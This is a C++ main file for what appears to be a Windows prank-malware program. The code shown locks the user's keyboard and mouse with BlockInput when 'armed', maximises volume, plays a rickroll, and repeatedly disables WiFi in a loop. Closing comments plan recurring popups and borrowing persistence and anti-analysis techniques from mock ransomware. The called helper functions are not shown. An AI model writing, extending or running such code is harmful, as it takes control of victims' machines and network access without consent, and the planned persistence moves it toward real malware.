#include "pch.h"
#include "definitions.h"
#include "cursor.h"
#include "audio.h"
#include "wallpaper.h"
#include "network.h"
#include "structures.h"
#include "system.h"

bool armed = false;

//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) // make sure to change this back after debug
int main(int argc, char **argv)
{
	if (argc == 1)
	{
		printf("Running in un-armed mode :(\n");
		armed = false;
	}
	HANDLE audioThread;
	bool done;
	int count;
	srand(time(NULL));

	if(armed) BlockInput(TRUE);
	MaxVol();
	
	//HANDLE mouseThread = CreateThread(0, 0, troll_the_mouse, NULL, 0, 0);

	done = false;
	audioThread = CreateThread(0, 0, SongPlayin, reinterpret_cast<void*>(&done), 0, 0); // Plays song (rickroll as of right now)
	
	CloseHandle(audioThread);
	//CloseHandle(mouseThread);
	count = 0;
	
	while (!done) { // # of reps
		KillWifi();
		count++;
		Sleep(2000); // Wait time
		printf("Reps: %d\n", count);
	}
	
	//CloseHandle(threadHandler);
	if(armed) BlockInput(FALSE);
	

	return 0;
}

/*
	Ideas to add:
		1. Add continually popping up Soviet Popup (https://stackoverflow.com/questions/1186017/how-do-i-build-a-graphical-user-interface-in-c)
			(http://www.cplusplus.com/forum/beginner/137030/)
			(https://stackoverflow.com/questions/2886609/how-to-make-multiple-windows-using-win32-api)
			(http://www.winprog.org/tutorial/start.html)

		2. Project type change note
		https://stackoverflow.com/questions/6626397/error-lnk2019-unresolved-external-symbol-winmain16-referenced-in-function#8532797

		3. Check out persistence and defensive methods from this mock ransomware and this mock malware
			https://github.com/ryancor/mock-ransomware/blob/master/ransomware/ransomware/anti_checks.cpp
			http://www.rohitab.com/discuss/topic/25977-malware-c/

*/